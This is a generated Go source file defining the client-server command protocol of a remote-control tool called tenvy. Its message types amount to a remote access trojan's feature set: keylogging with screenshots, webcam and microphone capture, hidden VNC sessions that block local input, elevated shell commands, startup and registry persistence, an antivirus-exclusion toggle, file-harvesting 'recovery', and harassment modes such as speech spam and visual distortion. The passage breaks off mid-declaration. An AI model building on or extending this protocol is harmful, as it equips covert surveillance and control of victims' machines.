// Code generated from JSON Schema using quicktype. DO NOT EDIT.
// To parse and unparse this JSON data, add this code to your project and do:
//
//    tenvyProtocol, err := UnmarshalTenvyProtocol(bytes)
//    bytes, err = tenvyProtocol.Marshal()

package protocol

import "time"

import "encoding/json"

func UnmarshalTenvyProtocol(data []byte) (TenvyProtocol, error) {
	var r TenvyProtocol
	err := json.Unmarshal(data, &r)
	return r, err
}

func (r *TenvyProtocol) Marshal() ([]byte, error) {
	return json.Marshal(r)
}

// Unified communication protocol between tenvy-server and tenvy-client.
type TenvyProtocol struct {
	AgentControlCommandPayload   *AgentControlCommandPayload   `json:"agentControlCommandPayload,omitempty"`
	AgentMetadata                *AgentMetadata                `json:"agentMetadata,omitempty"`
	AgentRegistrationRequest     *AgentRegistrationRequest     `json:"agentRegistrationRequest,omitempty"`
	AgentRegistrationResponse    *AgentRegistrationResponse    `json:"agentRegistrationResponse,omitempty"`
	AgentSyncRequest             *AgentSyncRequest             `json:"agentSyncRequest,omitempty"`
	AgentSyncResponse            *AgentSyncResponse            `json:"agentSyncResponse,omitempty"`
	AppVNCCommandPayload         *AppVNCCommandPayload         `json:"appVncCommandPayload,omitempty"`
	AudioControlCommandPayload   *AudioControlCommandPayload   `json:"audioControlCommandPayload,omitempty"`
	ClientChatCommandPayload     *ClientChatCommandPayload     `json:"clientChatCommandPayload,omitempty"`
	ClipboardCommandPayload      *ClipboardCommandPayload      `json:"clipboardCommandPayload,omitempty"`
	Command                      *CommandElement               `json:"command,omitempty"`
	CommandEnvelope              *CommandEnvelope              `json:"commandEnvelope,omitempty"`
	EncryptedEnvelope            *EncryptedEnvelope            `json:"encryptedEnvelope,omitempty"`
	CommandOutputEvent           *CommandOutputEvent           `json:"commandOutputEvent,omitempty"`
	CommandResult                *CommandResult                `json:"commandResult,omitempty"`
	EnvironmentCommandPayload    *EnvironmentCommandPayload    `json:"environmentCommandPayload,omitempty"`
	FileManagerCommandPayload    *FileManagerCommandPayload    `json:"fileManagerCommandPayload,omitempty"`
	GeoCommandPayload            *GeoCommandPayload            `json:"geoCommandPayload,omitempty"`
	KeyloggerCommandPayload      *KeyloggerCommandPayload      `json:"keyloggerCommandPayload,omitempty"`
	OpenURLCommandPayload        *OpenURLCommandPayload        `json:"openUrlCommandPayload,omitempty"`
	PingCommandPayload           *PingCommandPayload           `json:"pingCommandPayload,omitempty"`
	RecoveryCommandPayload       *RecoveryCommandPayload       `json:"recoveryCommandPayload,omitempty"`
	RegistryCommandPayload       *RegistryCommandPayload       `json:"registryCommandPayload,omitempty"`
	RemoteDesktopCommandPayload  *RemoteDesktopCommandPayload  `json:"remoteDesktopCommandPayload,omitempty"`
	ShellCommandPayload          *ShellCommandPayload          `json:"shellCommandPayload,omitempty"`
	StartupCommandPayload        *StartupCommandPayload        `json:"startupCommandPayload,omitempty"`
	SystemInfoCommandPayload     *SystemInfoCommandPayload     `json:"systemInfoCommandPayload,omitempty"`
	TaskManagerCommandPayload    *TaskManagerCommandPayload    `json:"taskManagerCommandPayload,omitempty"`
	TCPConnectionsCommandPayload *TCPConnectionsCommandPayload `json:"tcpConnectionsCommandPayload,omitempty"`
	ToolActivationCommandPayload *ToolActivationCommandPayload `json:"toolActivationCommandPayload,omitempty"`
	TriggerMonitorCommandPayload *TriggerMonitorCommandPayload `json:"triggerMonitorCommandPayload,omitempty"`
	WebcamCommandPayload         *WebcamCommandPayload         `json:"webcamCommandPayload,omitempty"`
}

type AgentControlCommandPayload struct {
	Action AgentControlCommandPayloadAction `json:"action"`
	Force  *bool                            `json:"force,omitempty"`
	Reason *string                          `json:"reason,omitempty"`
}

type AgentMetadata struct {
	Analysis        *string  `json:"analysis,omitempty"`
	Architecture    string   `json:"architecture"`
	HardwareID      *string  `json:"hardwareId,omitempty"`
	Hostname        string   `json:"hostname"`
	IPAddress       *string  `json:"ipAddress,omitempty"`
	OS              string   `json:"os"`
	PublicIPAddress *string  `json:"publicIpAddress,omitempty"`
	Tags            []string `json:"tags,omitempty"`
	Username        string   `json:"username"`
	Version         *string  `json:"version,omitempty"`
}

type AgentRegistrationRequest struct {
	Metadata  AgentMetadata `json:"metadata"`
	PublicKey *string       `json:"publicKey,omitempty"`
	Token     *string       `json:"token,omitempty"`
}

type AgentRegistrationResponse struct {
	AgentID         string           `json:"agentId"`
	AgentKey        string           `json:"agentKey"`
	Commands        []CommandElement `json:"commands,omitempty"`
	Config          AgentConfig      `json:"config"`
	ServerPublicKey *string          `json:"serverPublicKey,omitempty"`
	ServerTime      time.Time        `json:"serverTime"`
}

type CommandElement struct {
	CreatedAt time.Time              `json:"createdAt"`
	ID        string                 `json:"id"`
	Name      string                 `json:"name"`
	Payload   json.RawMessage `json:"payload"`
	Signature *string                `json:"signature,omitempty"`
}

type AgentConfig struct {
	JitterRatio    float64            `json:"jitterRatio"`
	MaxBackoffMS   int64              `json:"maxBackoffMs"`
	Plugins        *AgentPluginConfig `json:"plugins,omitempty"`
	PollIntervalMS int64              `json:"pollIntervalMs"`
}

type AgentPluginConfig struct {
	SignaturePolicy *AgentPluginSignaturePolicy `json:"signaturePolicy,omitempty"`
}

type AgentPluginSignaturePolicy struct {
	Ed25519PublicKeys map[string]string `json:"ed25519PublicKeys,omitempty"`
	MaxSignatureAgeMS *int64            `json:"maxSignatureAgeMs,omitempty"`
	Sha256AllowList   []string          `json:"sha256AllowList,omitempty"`
}

type AgentSyncRequest struct {
	Metrics   *AgentMetrics          `json:"metrics,omitempty"`
	Options   *OptionsState          `json:"options,omitempty"`
	Plugins   *PluginSyncPayload     `json:"plugins,omitempty"`
	Results   []CommandResult        `json:"results,omitempty"`
	Status    AgentSyncRequestStatus `json:"status"`
	Timestamp time.Time              `json:"timestamp"`
}

type AgentMetrics struct {
	Goroutines    *int64 `json:"goroutines,omitempty"`
	MemoryBytes   *int64 `json:"memoryBytes,omitempty"`
	UptimeSeconds *int64 `json:"uptimeSeconds,omitempty"`
}

type OptionsState struct {
	AutoMinimize      *bool                      `json:"autoMinimize,omitempty"`
	CursorBehavior    *string                    `json:"cursorBehavior,omitempty"`
	DefenderExclusion *bool                      `json:"defenderExclusion,omitempty"`
	FakeEventMode     *string                    `json:"fakeEventMode,omitempty"`
	KeyboardMode      *string                    `json:"keyboardMode,omitempty"`
	ScreenOrientation *string                    `json:"screenOrientation,omitempty"`
	Script            *OptionsScriptConfig       `json:"script,omitempty"`
	ScriptRuntime     *OptionsScriptRuntimeState `json:"scriptRuntime,omitempty"`
	SoundPlayback     *bool                      `json:"soundPlayback,omitempty"`
	SoundVolume       *float64                   `json:"soundVolume,omitempty"`
	SpeechSpam        *bool                      `json:"speechSpam,omitempty"`
	VisualDistortion  *string                    `json:"visualDistortion,omitempty"`
	WallpaperMode     *string                    `json:"wallpaperMode,omitempty"`
	WindowsUpdate     *bool                      `json:"windowsUpdate,omitempty"`
}

type OptionsScriptConfig struct {
	DelaySeconds *int64             `json:"delaySeconds,omitempty"`
	File         *OptionsScriptFile `json:"file,omitempty"`
	Loop         *bool              `json:"loop,omitempty"`
	Mode         *string            `json:"mode,omitempty"`
}

type OptionsScriptFile struct {
	Checksum string `json:"checksum"`
	Name     string `json:"name"`
	Path     string `json:"path"`
	Size     int64  `json:"size"`
	Type     string `json:"type"`
}

type OptionsScriptRuntimeState struct {
	Active          *bool      `json:"active,omitempty"`
	HasExitCode     *bool      `json:"hasExitCode,omitempty"`
	LastCompletedAt *time.Time `json:"lastCompletedAt,omitempty"`
	LastError       *string    `json:"lastError,omitempty"`
	LastExitCode    *int64     `json:"lastExitCode,omitempty"`
	LastStartedAt   *time.Time `json:"lastStartedAt,omitempty"`
	Runs            *int64     `json:"runs,omitempty"`
	Status          *string    `json:"status,omitempty"`
}

type PluginSyncPayload struct {
	Installations []PluginInstallationTelemetry `json:"installations,omitempty"`
	Manifests     *AgentPluginManifestState     `json:"manifests,omitempty"`
}

type PluginInstallationTelemetry struct {
	Error     *string            `json:"error,omitempty"`
	Hash      *string            `json:"hash,omitempty"`
	PluginID  string             `json:"pluginId"`
	Status    InstallationStatus `json:"status"`
	Timestamp *int64             `json:"timestamp,omitempty"`
	Version   string             `json:"version"`
}

type AgentPluginManifestState struct {
	Digests map[string]string `json:"digests,omitempty"`
	Version *string           `json:"version,omitempty"`
}

type CommandResult struct {
	CommandID   string    `json:"commandId"`
	CompletedAt time.Time `json:"completedAt"`
	Error       *string   `json:"error,omitempty"`
	Output      *string   `json:"output,omitempty"`
	Success     bool      `json:"success"`
}

type AgentSyncResponse struct {
	AgentID         string               `json:"agentId"`
	Commands        []CommandElement     `json:"commands"`
	Config          AgentConfig          `json:"config"`
	Options         *OptionsState        `json:"options,omitempty"`
	PluginManifests *PluginManifestDelta `json:"pluginManifests,omitempty"`
	ServerTime      time.Time            `json:"serverTime"`
}

type PluginManifestDelta struct {
	Removed []string                   `json:"removed"`
	Updated []PluginManifestDescriptor `json:"updated"`
	Version string                     `json:"version"`
}

type PluginManifestDescriptor struct {
	ApprovedAt        *time.Time   `json:"approvedAt,omitempty"`
	ArtifactHash      *string      `json:"artifactHash,omitempty"`
	ArtifactSizeBytes *int64       `json:"artifactSizeBytes,omitempty"`
	Dependencies      []string     `json:"dependencies,omitempty"`
	Distribution      Distribution `json:"distribution"`
	ManifestDigest    string       `json:"manifestDigest"`
	ManualPushAt      *time.Time   `json:"manualPushAt,omitempty"`
	PluginID          string       `json:"pluginId"`
	Version           string       `json:"version"`
}

type Distribution struct {
	AutoUpdate  bool        `json:"autoUpdate"`
	DefaultMode DefaultMode `json:"defaultMode"`
}

type AppVNCCommandPayload struct {
	Action         AppVNCCommandPayloadAction   `json:"action"`
	Application    *AppVNCApplicationDescriptor `json:"application,omitempty"`
	Events         []AppVNCInputEvent           `json:"events,omitempty"`
	SessionID      *string                      `json:"sessionId,omitempty"`
	Settings       *AppVNCSessionSettingsPatch  `json:"settings,omitempty"`
	Virtualization *AppVNCVirtualizationPlan    `json:"virtualization,omitempty"`
}

type AppVNCApplicationDescriptor struct {
	Category        string                     `json:"category"`
	Executable      map[string]string          `json:"executable,omitempty"`
	ID              string                     `json:"id"`
	Name            string                     `json:"name"`
	Platforms       []Platform                 `json:"platforms"`
	Summary         string                     `json:"summary"`
	Virtualization  *AppVNCVirtualizationHints `json:"virtualization,omitempty"`
	WindowTitleHint *string                    `json:"windowTitleHint,omitempty"`
}

type AppVNCVirtualizationHints struct {
	DataRoots    map[string]string            `json:"dataRoots,omitempty"`
	Environment  map[string]map[string]string `json:"environment,omitempty"`
	ProfileSeeds map[string]string            `json:"profileSeeds,omitempty"`
}

type AppVNCInputEvent struct {
	AltKey     *bool      `json:"altKey,omitempty"`
	Button     *Button    `json:"button,omitempty"`
	CapturedAt int64      `json:"capturedAt"`
	Code       *string    `json:"code,omitempty"`
	CtrlKey    *bool      `json:"ctrlKey,omitempty"`
	DeltaMode  *int64     `json:"deltaMode,omitempty"`
	DeltaX     *float64   `json:"deltaX,omitempty"`
	DeltaY     *float64   `json:"deltaY,omitempty"`
	Key        *string    `json:"key,omitempty"`
	KeyCode    *int64     `json:"keyCode,omitempty"`
	MetaKey    *bool      `json:"metaKey,omitempty"`
	Normalized *bool      `json:"normalized,omitempty"`
	Pressed    *bool      `json:"pressed,omitempty"`
	Repeat     *bool      `json:"repeat,omitempty"`
	ShiftKey   *bool      `json:"shiftKey,omitempty"`
	Type       PurpleType `json:"type"`
	X          *float64   `json:"x,omitempty"`
	Y          *float64   `json:"y,omitempty"`
}

type AppVNCSessionSettingsPatch struct {
	AppID             *string        `json:"appId,omitempty"`
	BlockLocalInput   *bool          `json:"blockLocalInput,omitempty"`
	CaptureCursor     *bool          `json:"captureCursor,omitempty"`
	ClipboardSync     *bool          `json:"clipboardSync,omitempty"`
	HeartbeatInterval *int64         `json:"heartbeatInterval,omitempty"`
	Monitor           *string        `json:"monitor,omitempty"`
	Quality           *PurpleQuality `json:"quality,omitempty"`
	WindowTitle       *string        `json:"windowTitle,omitempty"`
}

type AppVNCVirtualizationPlan struct {
	DataRoot    *string           `json:"dataRoot,omitempty"`
	Environment map[string]string `json:"environment,omitempty"`
	Platform    *Platform         `json:"platform,omitempty"`
	ProfileSeed *string           `json:"profileSeed,omitempty"`
}

type AudioControlCommandPayload struct {
	Action            AudioControlCommandPayloadAction    `json:"action"`
	Channels          *int64                              `json:"channels,omitempty"`
	ChaosMode         *bool                               `json:"chaosMode,omitempty"`
	DeviceID          *string                             `json:"deviceId,omitempty"`
	DeviceLabel       *string                             `json:"deviceLabel,omitempty"`
	Direction         *Direction                          `json:"direction,omitempty"`
	Encoding          *AudioControlCommandPayloadEncoding `json:"encoding,omitempty"`
	Loop              *bool                               `json:"loop,omitempty"`
	OutputDeviceID    *string                             `json:"outputDeviceId,omitempty"`
	OutputDeviceLabel *string                             `json:"outputDeviceLabel,omitempty"`
	RequestID         *string                             `json:"requestId,omitempty"`
	Rickroll          *bool                               `json:"rickroll,omitempty"`
	SampleRate        *int64                              `json:"sampleRate,omitempty"`
	SessionID         *string                             `json:"sessionId,omitempty"`
	StreamTransport   *AudioStreamTransport               `json:"streamTransport,omitempty"`
	TrackID           *string                             `json:"trackId,omitempty"`
	TrackURL          *string                             `json:"trackUrl,omitempty"`
	Volume            *float64                            `json:"volume,omitempty"`
}

type AudioStreamTransport struct {
	Headers   map[string]string        `json:"headers,omitempty"`
	Protocol  *string                  `json:"protocol,omitempty"`
	Transport StreamTransportTransport `json:"transport"`
	URL       string                   `json:"url"`
}

type ClientChatCommandPayload struct {
	Action    ClientChatCommandPayloadAction `json:"action"`
	Aliases   *ClientChatAliasConfiguration  `json:"aliases,omitempty"`
	Features  *ClientChatFeatureFlags        `json:"features,omitempty"`
	Message   *ClientChatCommandMessage      `json:"message,omitempty"`
	SessionID *string                        `json:"sessionId,omitempty"`
}

type ClientChatAliasConfiguration struct {
	Client   *string `json:"client,omitempty"`
	Operator *string `json:"operator,omitempty"`
}

type ClientChatFeatureFlags struct {
	AllowFileTransfers *bool `json:"allowFileTransfers,omitempty"`
	AllowNotifications *bool `json:"allowNotifications,omitempty"`
	Unstoppable        *bool `json:"unstoppable,omitempty"`
}

type ClientChatCommandMessage struct {
	Alias     *string    `json:"alias,omitempty"`
	Body      string     `json:"body"`
	ID        *string    `json:"id,omitempty"`
	Timestamp *time.Time `json:"timestamp,omitempty"`
}

type ClipboardCommandPayload struct {
	Action    ClipboardCommandPayloadAction `json:"action"`
	Content   *ClipboardContent             `json:"content,omitempty"`
	RequestID *string                       `json:"requestId,omitempty"`
	Sequence  *int64                        `json:"sequence,omitempty"`
	Source    *string                       `json:"source,omitempty"`
	Triggers  []ClipboardTrigger            `json:"triggers,omitempty"`
}

type ClipboardContent struct {
	Files    []ClipboardFileEntry `json:"files,omitempty"`
	Format   Format               `json:"format"`
	Image    *ClipboardImageData  `json:"image,omitempty"`
	Metadata map[string]string    `json:"metadata,omitempty"`
	Text     *ClipboardTextData   `json:"text,omitempty"`
}

type ClipboardFileEntry struct {
	Digest   *string `json:"digest,omitempty"`
	MIMEType *string `json:"mimeType,omitempty"`
	Name     string  `json:"name"`
	Path     *string `json:"path,omitempty"`
	Size     *int64  `json:"size,omitempty"`
}

type ClipboardImageData struct {
	Data     string `json:"data"`
	Height   *int64 `json:"height,omitempty"`
	MIMEType string `json:"mimeType"`
	Width    *int64 `json:"width,omitempty"`
}

type ClipboardTextData struct {
	Encoding *string `json:"encoding,omitempty"`
	Length   *int64  `json:"length,omitempty"`
	Value    string  `json:"value"`
}

type ClipboardTrigger struct {
	Action      ClipboardTriggerAction    `json:"action"`
	Active      bool                      `json:"active"`
	Condition   ClipboardTriggerCondition `json:"condition"`
	CreatedAt   time.Time                 `json:"createdAt"`
	Description *string                   `json:"description,omitempty"`
	ID          string                    `json:"id"`
	Label       string                    `json:"label"`
	UpdatedAt   *time.Time                `json:"updatedAt,omitempty"`
}

type ClipboardTriggerAction struct {
	Configuration json.RawMessage `json:"configuration,omitempty"`
	Type          ActionType             `json:"type"`
}

type ClipboardTriggerCondition struct {
	CaseSensitive *bool    `json:"caseSensitive,omitempty"`
	Formats       []Format `json:"formats,omitempty"`
	Pattern       *string  `json:"pattern,omitempty"`
}

type CommandEnvelope struct {
	AppVNCInput *AppVNCInputBurst        `json:"appVncInput,omitempty"`
	Command     *CommandElement          `json:"command,omitempty"`
	Input       *RemoteDesktopInputBurst `json:"input,omitempty"`
	Type        string                   `json:"type"`
}

type EncryptedEnvelope struct {
	Type string `json:"type"`
	Data string `json:"data"`
}

type AppVNCInputBurst struct {
	Events    []AppVNCInputEvent `json:"events"`
	Sequence  *int64             `json:"sequence,omitempty"`
	SessionID string             `json:"sessionId"`
}

type RemoteDesktopInputBurst struct {
	Events    []RemoteDesktopInputEvent `json:"events"`
	Sequence  *int64                    `json:"sequence,omitempty"`
	SessionID string                    `json:"sessionId"`
}

type RemoteDesktopInputEvent struct {
	AltKey     *bool      `json:"altKey,omitempty"`
	Button     *Button    `json:"button,omitempty"`
	CapturedAt int64      `json:"capturedAt"`
	Code       *string    `json:"code,omitempty"`
	CtrlKey    *bool      `json:"ctrlKey,omitempty"`
	DeltaMode  *int64     `json:"deltaMode,omitempty"`
	DeltaX     *float64   `json:"deltaX,omitempty"`
	DeltaY     *float64   `json:"deltaY,omitempty"`
	Key        *string    `json:"key,omitempty"`
	KeyCode    *int64     `json:"keyCode,omitempty"`
	MetaKey    *bool      `json:"metaKey,omitempty"`
	Monitor    *int64     `json:"monitor,omitempty"`
	Normalized *bool      `json:"normalized,omitempty"`
	Pressed    *bool      `json:"pressed,omitempty"`
	Repeat     *bool      `json:"repeat,omitempty"`
	ShiftKey   *bool      `json:"shiftKey,omitempty"`
	Type       FluffyType `json:"type"`
	X          *float64   `json:"x,omitempty"`
	Y          *float64   `json:"y,omitempty"`
}

type CommandOutputEvent struct {
	CommandID string                 `json:"commandId"`
	Data      *string                `json:"data,omitempty"`
	Result    *CommandResult         `json:"result,omitempty"`
	Sequence  *int64                 `json:"sequence,omitempty"`
	Timestamp time.Time              `json:"timestamp"`
	Type      CommandOutputEventType `json:"type"`
}

type EnvironmentCommandPayload struct {
	Action           EnvironmentCommandPayloadAction `json:"action"`
	InitiatedBy      *string                         `json:"initiatedBy,omitempty"`
	Key              *string                         `json:"key,omitempty"`
	RestartProcesses *bool                           `json:"restartProcesses,omitempty"`
	Scope            *EnvironmentCommandPayloadScope `json:"scope,omitempty"`
	Timestamp        time.Time                       `json:"timestamp"`
	Value            *string                         `json:"value,omitempty"`
}

type FileManagerCommandPayload struct {
	Action        FileManagerCommandPayloadAction    `json:"action"`
	Content       *string                            `json:"content,omitempty"`
	Destination   *string                            `json:"destination,omitempty"`
	Directory     *string                            `json:"directory,omitempty"`
	Encoding      *FileManagerCommandPayloadEncoding `json:"encoding,omitempty"`
	EntryType     *EntryType                         `json:"entryType,omitempty"`
	IncludeHidden *bool                              `json:"includeHidden,omitempty"`
	Name          *string                            `json:"name,omitempty"`
	Path          *string                            `json:"path,omitempty"`
	RequestID     *string                            `json:"requestId,omitempty"`
}

type GeoCommandPayload struct {
	Action          GeoCommandPayloadAction `json:"action"`
	IncludeMap      *bool                   `json:"includeMap,omitempty"`
	IncludeTimezone *bool                   `json:"includeTimezone,omitempty"`
	IP              *string                 `json:"ip,omitempty"`
	Provider        *Provider               `json:"provider,omitempty"`
}

type KeyloggerCommandPayload struct {
	Action    KeyloggerCommandPayloadAction `json:"action"`
	Config    *KeyloggerStartConfig         `json:"config,omitempty"`
	Mode      *ConfigMode                   `json:"mode,omitempty"`
	SessionID *string                       `json:"sessionId,omitempty"`
}

type KeyloggerStartConfig struct {
	BatchIntervalMS     *int64     `json:"batchIntervalMs,omitempty"`
	BufferSize          *int64     `json:"bufferSize,omitempty"`
	CadenceMS           *int64     `json:"cadenceMs,omitempty"`
	EmitProcessNames    *bool      `json:"emitProcessNames,omitempty"`
	EncryptAtREST       *bool      `json:"encryptAtRest,omitempty"`
	IncludeClipboard    *bool      `json:"includeClipboard,omitempty"`
	IncludeScreenshots  *bool      `json:"includeScreenshots,omitempty"`
	IncludeWindowTitles *bool      `json:"includeWindowTitles,omitempty"`
	Mode                ConfigMode `json:"mode"`
	RedactSecrets       *bool      `json:"redactSecrets,omitempty"`
}

type OpenURLCommandPayload struct {
	Note *string `json:"note,omitempty"`
	URL  string  `json:"url"`
}

type PingCommandPayload struct {
	Message *string `json:"message,omitempty"`
}

type RecoveryCommandPayload struct {
	ArchiveName *string                   `json:"archiveName,omitempty"`
	Notes       *string                   `json:"notes,omitempty"`
	RequestID   string                    `json:"requestId"`
	Selections  []RecoveryTargetSelection `json:"selections"`
}

type RecoveryTargetSelection struct {
	Label     *string  `json:"label,omitempty"`
	Path      *string  `json:"path,omitempty"`
	Paths     []string `json:"paths,omitempty"`
	Recursive *bool    `json:"recursive,omitempty"`
	Type      string   `json:"type"`
}

type RegistryCommandPayload struct {
	Request RegistryCommandRequest `json:"request"`
}

type RegistryCommandRequest struct {
	Depth        *int64              `json:"depth,omitempty"`
	Hive         *Hive               `json:"hive,omitempty"`
	KeyPath      *string             `json:"keyPath,omitempty"`
	Name         *string             `json:"name,omitempty"`
	Operation    PurpleOperation     `json:"operation"`
	OriginalName *string             `json:"originalName,omitempty"`
	ParentPath   *string             `json:"parentPath,omitempty"`
	Path         *string             `json:"path,omitempty"`
	Target       *Target             `json:"target,omitempty"`
	Value        *RegistryValueInput `json:"value,omitempty"`
}

type RegistryValueInput struct {
	Data        string    `json:"data"`
	Description *string   `json:"description,omitempty"`
	Name        string    `json:"name"`
	Type        ValueType `json:"type"`
}

type RemoteDesktopCommandPayload struct {
	Action    RemoteDesktopCommandPayloadAction `json:"action"`
	Events    []RemoteDesktopInputEvent         `json:"events,omitempty"`
	SessionID *string                           `json:"sessionId,omitempty"`
	Settings  *RemoteDesktopSettingsPatch       `json:"settings,omitempty"`
}

type RemoteDesktopSettingsPatch struct {
	Encoder           *Encoder           `json:"encoder,omitempty"`
	Hardware          *Hardware          `json:"hardware,omitempty"`
	Keyboard          *bool              `json:"keyboard,omitempty"`
	Mode              *SettingsMode      `json:"mode,omitempty"`
	Monitor           *int64             `json:"monitor,omitempty"`
	Mouse             *bool              `json:"mouse,omitempty"`
	Quality           *FluffyQuality     `json:"quality,omitempty"`
	TargetBitrateKbps *int64             `json:"targetBitrateKbps,omitempty"`
	Transport         *SettingsTransport `json:"transport,omitempty"`
}

type ShellCommandPayload struct {
	Command          string            `json:"command"`
	Elevated         *bool             `json:"elevated,omitempty"`
	Environment      map[string]string `json:"environment,omitempty"`
	TimeoutSeconds   *int64            `json:"timeoutSeconds,omitempty"`
	WorkingDirectory *string           `json:"workingDirectory,omitempty"`
}

type StartupCommandPayload struct {
	Request StartupCommandRequest `json:"request"`
}

type StartupCommandRequest struct {
	Definition *StartupEntryDefinition `json:"definition,omitempty"`
	Enabled    *bool                   `json:"enabled,omitempty"`
	EntryID    *string                 `json:"entryId,omitempty"`
	Operation  FluffyOperation         `json:"operation"`
	Refresh    *bool                   `json:"refresh,omitempty"`
}

type StartupEntryDefinition struct {
	Arguments   *string         `json:"arguments,omitempty"`
	Description *string         `json:"description,omitempty"`
	Enabled     *bool           `json:"enabled,omitempty"`
	Location    string          `json:"location"`
	Name        string          `json:"name"`
	Path        string          `json:"path"`
	Publisher   *string         `json:"publisher,omitempty"`
	Scope       DefinitionScope `json:"scope"`
	Source      Source          `json:"source"`
}

type SystemInfoCommandPayload struct {
	Refresh *bool `json:"refresh,omitempty"`
}

type TCPConnectionsCommandPayload struct {
	Action    TCPConnectionsCommandPayloadAction `json:"action"`
	Query     *TCPConnectionQuery                `json:"query,omitempty"`
	RequestID string                             `json:"requestId"`
}

type TCPConnectionQuery struct {
	IncludeIpv6  *bool   `json:"includeIpv6,omitempty"`
	Limit        *int64  `json:"limit,omitempty"`
	LocalFilter  *string `json:"localFilter,omitempty"`
	RemoteFilter *string `json:"remoteFilter,omitempty"`
	ResolveDNS   *bool   `json:"resolveDns,omitempty"`
	State        *string `json:"state,omitempty"`
}

type TaskManagerCommandPayload struct {
	Request TaskManagerCommandRequest `json:"request"`
}

type TaskManagerCommandRequest struct {
	Action    *RequestAction       `json:"action,omitempty"`
	Operation TentacledOperation   `json:"operation"`
	Payload   *StartProcessRequest `json:"payload,omitempty"`
	PID       *int64               `json:"pid,omitempty"`
}

type StartProcessRequest struct {
	Args    []string          `json:"args,omitempty"`
	Command string            `json:"command"`
	Cwd     *string           `json:"cwd,omitempty"`
	Env     map[string]string `json:"env,omitempty"`
}

type ToolActivationCommandPayload struct {
	Action      string                 `json:"action"`
	InitiatedBy *string                `json:"initiatedBy,omitempty"`
	Metadata    json.RawMessage `json:"metadata,omitempty"`
	Timestamp   *time.Time             `json:"timestamp,omitempty"`
	ToolID      string                 `json:"toolId"`
}

type TriggerMonitorCommandPayload struct {
	Action TriggerMonitorCommandPayloadAction `json:"action"`
	Config *TriggerMonitorConfigInput         `json:"config,omitempty"`
}

type TriggerMonitorConfigInput struct {
	Feed               Feed                           `json:"feed"`
	IncludeCommands    bool                           `json:"includeCommands"`
	IncludeScreenshots bool                           `json:"includeScreenshots"`
	RefreshSeconds     int64                          `json:"refreshSeconds"`
	Watchlist          []TriggerMonitorWatchlistEntry `json:"watchlist,omitempty"`
}

type TriggerMonitorWatchlistEntry struct {
	AlertOnClose bool   `json:"alertOnClose"`
	AlertOnOpen  bool   `json:"alertOnOpen"`
	DisplayName  string `json:"displayName"`
	ID           string `json:"id"`
	Kind         Kind   `json:"kind"`
}

type WebcamCommandPayload struct {
	Action      WebcamCommandPayloadAction `json:"action"`
	DeviceID    *string                    `json:"deviceId,omitempty"`
	Negotiation *WebcamNegotiationState    `json:"negotiation,omitempty"`
	RequestID   *string                    `json:"requestId,omitempty"`
	SessionID   *string                    `json:"sessionId,omitempty"`
	Settings    *WebcamStreamSettings      `json:"settings,omitempty"`
}

type WebcamNegotiationState struct {
	Answer *WebcamNegotiationAnswer `json:"answer,omitempty"`
	Offer  *WebcamNegotiationOffer  `json:"offer,omitempty"`
}

type WebcamNegotiationAnswer struct {
	Answer      *string  `json:"answer,omitempty"`
	DataChannel *string  `json:"dataChannel,omitempty"`
	IceServers  []string `json:"iceServers,omitempty"`
}

type WebcamNegotiationOffer struct {
	DataChannel *string           `json:"dataChannel,omitempty"`
	IceServers  []string          `json:"iceServers,omitempty"`
	Offer       *string           `json:"offer,omitempty"`
	Transport   SettingsTransport `json:"transport"`
}

type WebcamStreamSettings struct {
	FrameRate   *float64          `json:"frameRate,omitempty"`
	Height      *int64            `json:"height,omitempty"`
	MIMEType    *string           `json:"mimeType,omitempty"`
	PixelFormat *string           `json:"pixelFormat,omitempty"`
	Quality     *TentacledQuality `json:"quality,omitempty"`
	Width       *int64            `json:"width,omitempty"`
	Zoom        *float64          `json:"zoom,omitempty"`
}

type AgentControlCommandPayloadAction string

const (
	Disconnect    AgentControlCommandPayloadAction = "disconnect"
	Logoff        AgentControlCommandPayloadAction = "logoff"
	PurpleRestart AgentControlCommandPayloadAction = "restart"
	Reconnect     AgentControlCommandPayloadAction = "reconnect"
	Shutdown      AgentControlCommandPayloadAction = "shutdown"
	Sleep         AgentControlCommandPayloadAction = "sleep"
)

type InstallationStatus string

const (
	Blocked   InstallationStatus = "blocked"
	Disabled  InstallationStatus = "disabled"
	Error     InstallationStatus = "error"
	Installed InstallationStatus = "installed"
)

type AgentSyncRequestStatus string

const (
	Busy          AgentSyncRequestStatus = "busy"
	Online        AgentSyncRequestStatus = "online"
	StatusOffline AgentSyncRequestStatus = "offline"
)

type DefaultMode string

const (
	Automatic DefaultMode = "automatic"
	Manual    DefaultMode = "manual"
)

type AppVNCCommandPayloadAction string

const (
	Heartbeat       AppVNCCommandPayloadAction = "heartbeat"
	PurpleConfigure AppVNCCommandPayloadAction = "configure"
	PurpleInput     AppVNCCommandPayloadAction = "input"
	PurpleStart     AppVNCCommandPayloadAction = "start"
	PurpleStop      AppVNCCommandPayloadAction = "stop"
)

type Platform string

const (
	Linux   Platform = "linux"
	Macos   Platform = "macos"
	Windows Platform = "windows"
)

type Button string

const (
	Left   Button = "left"
	Middle Button = "middle"
	Right  Button = "right"
)

type PurpleType string

const (
	PointerButton PurpleType = "pointer-button"
	PointerMove   PurpleType = "pointer-move"
	PointerScroll PurpleType = "pointer-scroll"
	PurpleKey     PurpleType = "key"
)

type PurpleQuality string

const (
	Balanced  PurpleQuality = "balanced"
	Bandwidth PurpleQuality = "bandwidth"
	Lossless  PurpleQuality = "lossless"
)

type AudioControlCommandPayloadAction string

const (
	FluffyStart     AudioControlCommandPayloadAction = "start"
	FluffyStop      AudioControlCommandPayloadAction = "stop"
	Inventory       AudioControlCommandPayloadAction = "inventory"
	PlaybackPause   AudioControlCommandPayloadAction = "playback-pause"
	PlaybackResume  AudioControlCommandPayloadAction = "playback-resume"
	PlaybackStart   AudioControlCommandPayloadAction = "playback-start"
	PlaybackStop    AudioControlCommandPayloadAction = "playback-stop"
	PurpleEnumerate AudioControlCommandPayloadAction = "enumerate"
)

type Direction string

const (
	DirectionInput Direction = "input"
	Output         Direction = "output"
)

type AudioControlCommandPayloadEncoding string

const (
	Pcm16 AudioControlCommandPayloadEncoding = "pcm16"
)

type StreamTransportTransport string

const (
	HTTPChunk StreamTransportTransport = "http-chunk"
	Websocket StreamTransportTransport = "websocket"
)

type ClientChatCommandPayloadAction string

const (
	FluffyConfigure ClientChatCommandPayloadAction = "configure"
	SendMessage     ClientChatCommandPayloadAction = "send-message"
	TentacledStart  ClientChatCommandPayloadAction = "start"
	TentacledStop   ClientChatCommandPayloadAction = "stop"
)

type ClipboardCommandPayloadAction string

const (
